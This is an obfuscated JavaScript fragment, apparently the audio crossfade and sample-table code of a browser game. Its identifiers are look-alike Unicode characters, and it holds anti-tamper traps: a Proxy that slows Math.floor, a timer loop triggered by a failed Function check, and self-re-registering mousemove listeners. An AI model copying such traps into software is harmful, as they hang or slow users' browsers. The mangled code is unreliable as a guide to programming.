		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⲆΔᐃΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⵠΔⲆΔΔΔⵠⵠ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⵠⲆΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		const ᐃΔΔᐃᐃ = {};
		const ᐃᐃᐃΔⲆⵠᐃⵠⵠ = {};
		ᐃΔΔᐃᐃ["get"] = function(ᐃⵠᐃⲆΔⵠⲆⲆⲆ, ᐃⲆΔΔΔⵠΔⲆᐃ) {
			if (ᐃⲆΔΔΔⵠΔⲆᐃ !== "ᐃΔΔᐃᐃ") {
				const ᐃΔΔᐃᐃ = Math.floor;
				let ⵠᐃΔⲆᐃΔⵠ = 0;
				const ᐃⵠᐃⲆΔⵠⲆⲆⲆ = function(ᐃⵠᐃⲆΔⵠⲆⲆⲆ) {
					for (let ᐃⲆΔΔΔⵠΔⲆᐃ = 0; ᐃⲆΔΔΔⵠΔⲆᐃ < 397; ᐃⲆΔΔΔⵠΔⲆᐃ++) ⵠᐃΔⲆᐃΔⵠ += ᐃⲆΔΔΔⵠΔⲆᐃ;
					return ᐃΔΔᐃᐃ(ᐃⵠᐃⲆΔⵠⲆⲆⲆ)
				};
				Math.floor = ᐃⵠᐃⲆΔⵠⲆⲆⲆ
			}
			return ᐃⲆᐃΔᐃⵠᐃ["Reflect"]["get"](...arguments)
		};
		const ⵠᐃΔⲆᐃΔⵠ = new ᐃⲆᐃΔᐃⵠᐃ["Proxy"](ᐃᐃᐃΔⲆⵠᐃⵠⵠ, ᐃΔΔᐃᐃ);
		const ᐃΔⲆⲆⵠΔⵠ = ⵠᐃΔⲆᐃΔⵠ.ᐃΔΔᐃᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔΔΔⵠΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠΔᐃⵠΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃΔⲆᐃᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⵠⵠΔᐃ] = ᐃⲆΔᐃ.ΔⵠⵠΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔΔⲆⵠΔ] = ᐃⲆΔᐃ.ΔⵠⵠΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠᐃΔΔᐃ] = ᐃⲆΔᐃ.ΔⵠⵠΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ᐃⲆΔᐃ.ΔⵠⵠΔᐃ;
		ⵠⲆΔΔ = [];
		ⵠⲆΔΔ[ᐃΔΔ] = ΔΔⵠⵠ;
		ⵠⲆΔΔ[1] = 1;
		ⵠⲆΔΔ[2] = 1;
		ⵠⲆΔΔ[ΔΔⵠΔ] = 1;
		ⵠⲆΔΔ[4] = Δᐃᐃⵠ;
		ⵠⲆΔΔ[5] = Ⲇᐃᐃᐃ;
		ⵠⲆΔΔ[ⵠΔⵠᐃⵠ] = ᐃⵠΔ;
		ⵠⲆΔΔ[7] = 0;
		ⵠⲆΔΔ[8] = Δᐃᐃⵠ;
		ⵠⲆΔΔ[ⲆΔⵠᐃΔ] = ⵠᐃⲆᐃ;
		ⵠⲆΔΔ[ᐃⵠΔⵠⵠ] = ᐃⲆᐃ;
		ⵠⲆΔΔ[11] = ⵠⲆΔ;
		ⵠⲆΔΔ[12] = ΔⲆᐃᐃ;
		ⵠⲆΔΔ[ⵠᐃᐃΔⲆ] = 1;
		ⵠⲆΔΔ[ΔⵠⵠΔⵠᐃⲆ] = ⲆⵠⲆⲆ;
		ⵠⲆΔΔ[15] = 1;
		ⵠⲆΔΔ[ⵠΔⵠΔΔ] = ⲆⲆⲆᐃ;
		ⵠⲆΔΔ[ⲆᐃᐃⲆΔ] = 0;
		ⵠⲆΔΔ[18] = 0;
		ⵠⲆΔΔ[19] = ⵠⲆⲆ;
		ⵠⲆΔΔ[ⲆΔⲆⲆΔ] = Δᐃᐃᐃ;
		ⵠⲆΔΔ[21] = 0;
		ⵠⲆΔΔ[22] = ᐃⵠⲆ;
		ⵠⲆΔΔ[23] = ⵠⲆΔ;
		ⵠⲆΔΔ[24] = ᐃᐃⵠ;
		ⵠⲆΔΔ[25] = 1;
		ⵠⲆΔΔ[26] = 1;
		ⵠⲆΔΔ[27] = ᐃᐃⲆΔ;
		ⵠⲆΔΔ[28] = 1;
		ⵠⲆΔΔ[29] = 1;
		ⵠⲆΔΔ[30] = ΔⲆⵠ;
		ⵠⲆΔΔ[31] = 1;
		ⵠⲆΔΔ[32] = 1;

		function ⵠΔᐃΔᐃΔⲆ() {
			return 649589
		}
		const ᐃΔⲆⲆⲆΔΔΔᐃ = 11470504;
		const ΔⵠⵠⲆⵠⵠΔ = ⵠΔᐃΔᐃΔⲆ + " let ⲆⲆᐃⲆᐃΔᐃⲆⵠ = ⵠΔᐃΔᐃΔⲆ () * 165823; return ⲆⲆᐃⲆᐃΔᐃⲆⵠ;";
		const ᐃⵠΔΔⲆⲆΔΔⲆ = new Function(ΔⵠⵠⲆⵠⵠΔ);
		try {
			ᐃⵠΔΔⲆⲆΔΔⲆ(ᐃΔⲆⲆⲆΔΔΔᐃ)
		} catch (e) {
			const ᐃΔⲆⲆⲆΔΔΔᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]];
			const ΔⵠⵠⲆⵠⵠΔ = ᐃΔⲆⲆⲆΔΔΔᐃ;
			const ⲆⲆᐃⲆᐃΔᐃⲆⵠ = function() {
				ᐃΔⲆⲆⲆΔΔΔᐃ(ⲆⲆᐃⲆᐃΔᐃⲆⵠ, 6390);
				ΔⵠⵠⲆⵠⵠΔ(ⲆⲆᐃⲆᐃΔᐃⲆⵠ, 318)
			};
			ⲆⲆᐃⲆᐃΔᐃⲆⵠ()
		}
		ⵠⲆΔΔ[33] = ⲆⵠⲆⲆ;
		ⵠⲆΔΔ[34] = 1;
		ⵠⲆΔΔ[35] = ΔΔᐃⵠ;
		ⵠⲆΔΔ[36] = 1;
		ⵠⲆΔΔ[37] = 1;
		ⵠⲆΔΔ[38] = 1;
		ⵠⲆΔΔ[40] = Δⵠᐃ;
		ⵠⲆΔΔ[41] = Δᐃᐃⵠ;
		ⵠⲆΔΔ[42] = Ⲇᐃᐃᐃ;
		ⵠⲆΔΔ[50] = 1;
		ⵠⲆΔΔ[51] = ΔⵠⲆΔ;
		const ΔΔ = 16703192;

		function ⲆⲆ(ⵠⵠ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ⵠⵠ)
		}

		function ⵠΔ(ⵠᐃΔ) {
			return ⵠᐃΔ.map(ⲆⲆ).join("")
		}
		const ⲆᐃⲆ = function() {
			const ⵠΔⵠ = ⵠΔ([916, 916]);
			const ᐃⲆⵠ = {
				"ⲆΔⲆ": 2737381,
				"ΔΔᐃⲆΔᐃᐃ": 11563398,
				"ΔΔ": 10426587,
				"ᐃⵠⲆⲆ": 3204128
			};
			if (ᐃⲆⵠ[ⵠΔⵠ] !== ᐃⲆⵠ.ΔΔ) {
				const ΔΔ = function() {
					ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
						ΔΔ()
					}))
				};
				ΔΔ()
			}
		};
		ⲆᐃⲆ();
		ⵠⲆΔΔ[52] = ⵠΔᐃ;
		ⵠⲆΔΔ[55] = 0;
		ⵠⲆΔΔ[56] = Ⲇᐃᐃᐃ;
		ⵠⲆΔΔ[57] = ⵠⲆⲆ;
		ⵠⲆΔΔ[58] = 0;
		ⵠⲆⲆΔⵠ = [];
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⲆΔⲆⲆ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⲆΔᐃΔ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠΔⵠᐃΔ] = -ⵠΔⵠΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⵠⲆΔⲆ] = -ⵠⲆΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ᐃⲆⲆΔᐃ] = Δᐃᐃᐃ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔΔⵠᐃ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔⲆΔⲆᐃ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠᐃΔⲆⲆ] = ⵠΔⲆⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔΔⲆᐃᐃ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔⲆᐃΔⵠ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔⵠΔⲆⲆ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆᐃᐃΔⲆ] = ΔⲆⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔⲆᐃᐃ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ᐃΔᐃΔⵠ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔᐃΔᐃⵠ] = ΔⲆᐃᐃ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⵠⵠΔⲆ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔᐃΔᐃ] = ⵠΔΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔⲆⵠΔ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⲆΔⵠⲆ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔⲆⵠⵠᐃ] = ΔⲆⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠᐃⲆᐃⲆ] = Ⲇᐃⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ] = ΔᐃΔΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆΔⵠΔΔ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ] = ᐃᐃⲆΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⲆΔΔⵠ] = ⵠᐃⵠΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ᐃᐃΔΔⲆ] = 0;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ] = ⵠⲆΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆᐃΔΔⲆ] = ΔΔᐃⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ] = ⵠᐃⵠΔ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠΔⵠΔᐃ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ] = ⵠΔⲆ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ΔᐃΔⲆᐃ] = 1;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ] = Ⲇᐃⵠⵠ;
		ⵠⲆⲆΔⵠ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ] = ᐃᐃⵠ;
		var ᐃΔⵠΔⲆ = {
			"ᐃΔᐃⲆⲆΔΔ": {
				"ΔⲆΔΔᐃ": null,
				path: [ⵠ[317]],
				"ⵠⲆ": {
					d1: [90391, 300, ᐃⵠΔⵠⲆ],
					d2: [90684, 300, ⲆᐃⵠⲆⵠ],
					d0: [90086, 300, ⵠᐃΔΔⵠ]
				},
				sample: {
					d0: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					d1: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					d2: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ
				}
			},
			"ΔⵠⵠΔΔⲆΔ": {
				"ΔⲆΔΔᐃ": null,
				path: [ⵠ[317]],
				"ⵠⲆ": {
					p1: [89549, 300, false],
					p0: [89303, 300, false],
					p2: [89815, 300, false]
				},
				sample: {
					p0: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					p1: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					p2: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ
				}
			},
			"ⲆⲆⵠΔⲆⲆᐃ": {
				"ΔⲆΔΔᐃ": null,
				path: [ⵠ[317]],
				"ⵠⲆ": {
					w3: [89025, 300, ᐃⵠⵠⲆᐃ],
					w1: [88473, 300, false],
					w2: [88751, 300, ᐃᐃΔᐃΔ],
					w0: [88195, 300, false]
				},
				sample: {
					w0: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					w1: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					w2: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					w3: ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ
				}
			},
			"ΔⵠΔᐃΔⵠⵠ": {
				"ΔⲆΔΔᐃ": null,
				path: [ⵠ[317]],
				"ⵠⲆ": {
					"ⵠᐃⲆΔⲆ": [12356, 6965, ⲆᐃΔⲆⲆ],
					"ⵠⲆⵠⲆΔⲆΔ": [30562, 655, ⲆᐃΔⲆⲆ],
					"ⲆΔΔΔΔⵠΔ": [66961, 21223, ⵠᐃⲆᐃΔ],
					"ΔⲆⵠⵠⲆⵠΔ": [19882, 8301, ᐃΔᐃⵠΔ],
					"ΔⲆⲆⲆᐃ": [91431, 400, ΔᐃⵠᐃⲆ],
					"ⵠⵠᐃᐃⵠᐃΔ": [31658, 813, true],
					"ⵠⲆⲆᐃΔᐃᐃ": [3100, 8800, ⵠⲆΔᐃⲆ],
					"ΔΔΔⲆⲆⵠᐃ": [32604, 21890, true],
					"ⵠⲆᐃᐃⲆΔⵠ": [91022, 400, false],
					"ᐃΔΔΔⵠΔᐃ": [66014, 925, ΔᐃⲆⵠⵠ],
					"ⵠᐃⲆⲆⲆⲆⵠ": [54524, 11393, true],
					"ⵠΔⵠⲆⲆΔⵠ": [66961, 21223, ⵠⲆⵠⵠΔ],
					"ⵠᐃⲆΔⵠⵠᐃ": [92249, 500, ⲆΔⵠⲆΔ],
					"ⲆΔᐃⲆⲆ": [28380, 1797, ⵠᐃⲆᐃΔ],
					"ⲆᐃΔᐃⵠⲆⲆΔⲆ": [ⵠᐃⲆΔΔ, 2800, ᐃᐃⲆᐃᐃ]
				},
				sample: {
					"ⲆᐃΔᐃⵠⲆⲆΔⲆ": ᐃⲆᐃ,
					"ⵠⲆⲆᐃΔᐃᐃ": 1,
					"ΔⲆⵠⵠⲆⵠΔ": 1,
					"ΔΔΔⲆⲆⵠᐃ": ΔΔᐃⵠ,
					"ⵠᐃⲆⲆⲆⲆⵠ": 1,
					"ⵠΔⵠⲆⲆΔⵠ": ΔΔΔ,
					"ⲆΔΔΔΔⵠΔ": 1,
					"ⵠᐃⲆΔⲆ": ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					"ⲆΔᐃⲆⲆ": ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					"ⵠⲆⵠⲆΔⲆΔ": ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					"ⵠⵠᐃᐃⵠᐃΔ": ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					"ᐃΔΔΔⵠΔᐃ": ᐃⲆΔᐃ.ⵠⲆⵠⵠⲆ,
					"ⵠⲆᐃᐃⲆΔⵠ": ᐃⲆΔᐃ.ⲆⲆᐃ,
					"ΔⲆⲆⲆᐃ": ᐃⲆΔᐃ.ⲆⲆᐃ,
					"ⵠᐃⲆΔⵠⵠᐃ": ᐃⲆΔᐃ.ⲆⲆᐃ
				}
			}
		};

		function ΔΔᐃΔᐃΔᐃ(ᐃΔᐃⵠⵠⵠⲆ, ⵠΔⵠᐃⲆⲆᐃ, ᐃⵠⵠⵠΔᐃⲆ, ΔⲆΔⵠⲆᐃⵠ, ⵠᐃᐃᐃⵠΔᐃⵠΔ) {
			const ΔⲆΔⵠΔᐃᐃ = (16 << (ᐃΔᐃⵠⵠⵠⲆ >> 0 & 255)) + (0 << (ᐃΔᐃⵠⵠⵠⲆ >> 16 & 255)) + (24 << (ᐃΔᐃⵠⵠⵠⲆ >> 24 & 255)) + (8 << (ᐃΔᐃⵠⵠⵠⲆ >> 8 & ⵠᐃⲆᐃᐃⵠᐃ));
			const ⵠΔⵠΔⵠΔᐃΔᐃ = (ⵠΔⵠᐃⲆⲆᐃ + 23532) % 65422;
			const ΔⲆⲆᐃᐃⵠΔΔⵠ = ~(30761 & ᐃⵠⵠⵠΔᐃⲆ) & 30761 | ~(30761 & ᐃⵠⵠⵠΔᐃⲆ) & ᐃⵠⵠⵠΔᐃⲆ;
			const ⵠΔΔᐃⲆⵠⲆⵠⵠ = (16 << (ΔⲆΔⵠⲆᐃⵠ >> 16 & 255)) + (8 << (ΔⲆΔⵠⲆᐃⵠ >> 0 & 255)) + (24 << (ΔⲆΔⵠⲆᐃⵠ >> 24 & ⵠᐃᐃⵠⲆⵠⲆ)) + (0 << (ΔⲆΔⵠⲆᐃⵠ >> 8 & 255));
			const ⲆⲆΔᐃᐃⲆⲆΔⲆ = (1013904223 + 1664525 * (ⵠᐃᐃᐃⵠΔᐃⵠΔ + 28208)) % 4294967296;
			const ⵠⵠᐃⵠⲆΔΔⲆᐃ = ᐃⲆᐃⵠⲆⵠᐃ(ΔⲆΔⵠΔᐃᐃ, ⵠΔⵠΔⵠΔᐃΔᐃ);
			const ⵠⲆᐃⵠΔΔΔᐃⵠ = ΔᐃⲆⲆΔΔΔᐃⵠ(ΔⲆⲆᐃᐃⵠΔΔⵠ, ⵠΔΔᐃⲆⵠⲆⵠⵠ, ⲆⲆΔᐃᐃⲆⲆΔⲆ, ΔⲆΔⵠΔᐃᐃ);
			const ⲆᐃΔⲆⲆΔⲆΔⲆ = ((ⵠⵠᐃⵠⲆΔΔⲆᐃ ^ ⵠⲆᐃⵠΔΔΔᐃⵠ) + 50412) % 65511;
			return ⲆᐃΔⲆⲆΔⲆΔⲆ
		}
		var ⲆᐃᐃΔⲆⲆᐃ = function(ΔⲆΔⲆΔ, ΔΔᐃ, ᐃΔⲆ, ᐃΔΔⵠᐃᐃᐃ, ΔᐃⲆⵠᐃⵠⲆ, ⵠⲆⲆᐃΔⵠⲆ, ⵠΔⲆΔ, ⵠΔΔⵠⲆΔᐃ, ⲆⲆᐃⲆⵠ, ⲆⲆⵠⲆᐃΔⲆᐃᐃ, ΔᐃᐃⵠΔⲆᐃ) {
			this.r = 1;
			this.ΔⲆΔⲆΔ = ΔⲆΔⲆΔ;
			this.ⲆⵠⲆⲆⲆⲆΔ = ΔⲆΔⲆΔ;
			this.ΔΔᐃ = ΔΔᐃ;
			this.ᐃΔⲆ = ᐃΔⲆ;
			this.fade = ᐃΔΔⵠᐃᐃᐃ;
			this.ΔᐃⲆⵠᐃⵠⲆ = ΔᐃⲆⵠᐃⵠⲆ;
			this.ⵠⲆⲆᐃΔⵠⲆ = ⵠⲆⲆᐃΔⵠⲆ;
			this.ⵠΔⲆΔ = ⵠΔⲆΔ;
			this.ⵠΔΔⵠⲆΔᐃ = ⵠΔΔⵠⲆΔᐃ;
			this.source = ⲆⲆᐃⲆⵠ;
			this.source.ΔᐃⲆᐃᐃⵠᐃ = ⲆⲆᐃⲆⵠ.x + ⲆⲆᐃⲆⵠ.w;
			this.source.ⵠᐃᐃⲆⵠ = ⲆⲆᐃⲆⵠ.y + ⲆⲆᐃⲆⵠ.ⵠⵠᐃ;
			this.ΔⵠΔᐃΔⲆⵠᐃⲆ = ⲆⲆⵠⲆᐃΔⲆᐃᐃ;
			this.ᐃΔᐃΔᐃᐃⲆ = ΔᐃᐃⵠΔⲆᐃ;
			this.ΔᐃᐃⵠΔⲆᐃ = ΔⲆⵠⲆ;
			this.ⲆΔⵠᐃⲆΔᐃ = {
				"ⵠΔᐃΔⵠ": ⵠⵠΔΔ,
				d: ᐃᐃⲆᐃ
			};
			this.ⵠᐃⲆΔⵠ = function() {
				this.ΔⲆΔⲆΔ -= ᐃⵠᐃᐃ;
				if (this.ΔⲆΔⲆΔ < ΔⲆⲆ) {
					this.ΔⲆΔⲆΔ = this.ⲆⵠⲆⲆⲆⲆΔ;
					var ᐃⵠⵠⵠ = ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ[ⵠ[421]](this.ΔΔᐃ);
					var Δⵠⵠᐃ = ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ[ⵠ[421]](this.ᐃΔⲆ);
					if (ᐃⵠⵠⵠ && !Δⵠⵠᐃ) {
						var ΔᐃΔ = this.ⵠΔⲆΔ[ⵠ[ᐃⵠᐃᐃᐃⲆΔ]](this.ΔΔᐃ) * ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ;
						var ⲆⲆⵠ = (Math.random() * this.ⵠⲆⲆᐃΔⵠⲆ + this.ΔᐃⲆⵠᐃⵠⲆ) * ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ;
						this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, ⲆⲆⵠ, this.fade, this.ΔΔᐃ)
					} else if (!ᐃⵠⵠⵠ && Δⵠⵠᐃ) {
						var ΔᐃΔ = ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ * this.ⵠΔⲆΔ[ⵠ[255]](this.ᐃΔⲆ);
						var ⲆⲆⵠ = ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ * (this.ⵠⲆⲆᐃΔⵠⲆ * Math.random() + this.ΔᐃⲆⵠᐃⵠⲆ);
						this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, ⲆⲆⵠ, this.fade, this.ᐃΔⲆ)
					}
				}
			};
			this.transition = function() {
				this.ΔⲆΔⲆΔ = this.ⲆⵠⲆⲆⲆⲆΔ;
				this.ⲆΔⵠᐃⲆΔᐃ.d = this.ⲆΔⵠᐃⲆΔᐃ.ⵠΔᐃΔⵠ;
				if (ⲆⲆⲆ.time) {
					this.ⵠΔⲆΔ[ⵠ[315]](0, this.ΔᐃⲆⵠᐃⵠⲆ * ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ, this.ⵠΔΔⵠⲆΔᐃ, this.ΔΔᐃ);
					this.ⵠΔⲆΔ[ⵠ[500]](this.ΔΔᐃ);
					if (this.ⵠΔⲆΔ[ⵠ[421]](this.ᐃΔⲆ)) {
						var ΔᐃΔ = this.ⵠΔⲆΔ[ⵠ[255]](this.ᐃΔⲆ) * ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ;
						this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, 0, this.ⵠΔΔⵠⲆΔᐃ, this.ᐃΔⲆ)
					}
				} else {
					this.ⵠΔⲆΔ[ⵠ[315]](ᐃΔΔ, ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ * this.ΔᐃⲆⵠᐃⵠⲆ, this.ⵠΔΔⵠⲆΔᐃ, this.ᐃΔⲆ);
					this.ⵠΔⲆΔ[ⵠ[500]](this.ᐃΔⲆ);
					if (this.ⵠΔⲆΔ[ⵠ[421]](this.ΔΔᐃ)) {
						var ΔᐃΔ = this.ⵠΔⲆΔ[ⵠ[255]](this.ΔΔᐃ) * ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ;
						this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, 0, this.ⵠΔΔⵠⲆΔᐃ, this.ΔΔᐃ)
					}
				}
			};
			this.check = function(ᐃⲆⲆ) {
				if (this.ΔᐃᐃⵠΔⲆᐃ) {
					if (!ΔΔⲆᐃ.ᐃΔᐃΔᐃᐃⲆ(ᐃⲆⲆ, this.ΔⵠΔᐃΔⲆⵠᐃⲆ)) {
						this.ΔᐃᐃⵠΔⲆᐃ = 0;
						if (this.ⵠΔⲆΔ[ⵠ[421]](this.ΔΔᐃ)) {
							var ΔᐃΔ = ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ * this.ⵠΔⲆΔ[ⵠ[ΔⵠⲆΔᐃΔⵠ]](this.ΔΔᐃ);
							this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, ᐃⵠΔ, this.ⵠΔΔⵠⲆΔᐃ, this.ΔΔᐃ)
						}
						if (this.ⵠΔⲆΔ[ⵠ[421]](this.ᐃΔⲆ)) {
							var ΔᐃΔ = ᐃⵠᐃⵠⲆ.ⲆΔⲆᐃⲆ * this.ⵠΔⲆΔ[ⵠ[255]](this.ᐃΔⲆ);
							this.ⵠΔⲆΔ[ⵠ[315]](ΔᐃΔ, ᐃΔΔ, this.ⵠΔΔⵠⲆΔᐃ, this.ᐃΔⲆ)
						}
					} else if (!ⲆⲆⵠⲆ.transition && ⲆⲆⲆ.ⲆΔΔΔⵠ.now < ᐃⲆΔᐃ.ᐃⲆΔΔᐃⲆΔ) {
						if (ⲆⲆⲆ.time) {
							if (!this.ⵠΔⲆΔ[ⵠ[421]](this.ΔΔᐃ)) {
								this.ⲆΔⵠᐃⲆΔᐃ.d -= ᐃⵠᐃᐃ;
								ⵠΔⲆⵠ > this.ⲆΔⵠᐃⲆΔᐃ.d && this.transition()
							}
						} else {
							if (!this.ⵠΔⲆΔ[ⵠ[421]](this.ᐃΔⲆ)) {
								this.ⲆΔⵠᐃⲆΔᐃ.d -= ᐃⵠᐃᐃ;
								if (0 > this.ⲆΔⵠᐃⲆΔᐃ.d) this.transition()
							}
						}
					}
				} else {
					if (ΔΔⲆᐃ.ᐃΔᐃΔᐃᐃⲆ(ᐃⲆⲆ, this.ᐃΔᐃΔᐃᐃⲆ)) {
						this.ΔᐃᐃⵠΔⲆᐃ = 1;
						!ⲆⲆⵠⲆ.transition && ⲆⲆⲆ.ⲆΔΔΔⵠ.now < ᐃⲆΔᐃ.ᐃⲆΔΔᐃⲆΔ && this.transition()
					}
				}
			};
			this.ⵠⲆᐃ = function(ᐃⲆⲆ, ᐃᐃΔⵠⲆ) {
				var Δⵠ, ⲆⵠⲆ;
				if (this.source.x > ᐃⲆⲆ.x) Δⵠ = ⲆⲆⵠⲆ.ⵠⵠⵠⵠΔᐃΔ(this.source.x);
				else if (this.source.ΔᐃⲆᐃᐃⵠᐃ < ᐃⲆⲆ.x) Δⵠ = ⲆⲆⵠⲆ.ⵠⵠⵠⵠΔᐃΔ(this.source.ΔᐃⲆᐃᐃⵠᐃ);
				else Δⵠ = ᐃᐃΔⵠⲆ.x;
				if (this.source.y > ᐃⲆⲆ.y) ⲆⵠⲆ = ⲆⲆⵠⲆ.ⵠⲆΔⵠΔᐃⲆ(this.source.y);
				else this.source.ⵠᐃᐃⲆⵠ < ᐃⲆⲆ.y ? ⲆⵠⲆ = ⲆⲆⵠⲆ.ⵠⲆΔⵠΔᐃⲆ(this.source.ⵠᐃᐃⲆⵠ) : ⲆⵠⲆ = ᐃᐃΔⵠⲆ.y;
				this.ⵠΔⲆΔ[ⵠ[307]](Δⵠ, ⲆⵠⲆ, -.5, this.ΔΔᐃ);
				this.ⵠΔⲆΔ[ⵠ[307]](Δⵠ, ⲆⵠⲆ, -.5, this.ᐃΔⲆ)
			}
		};

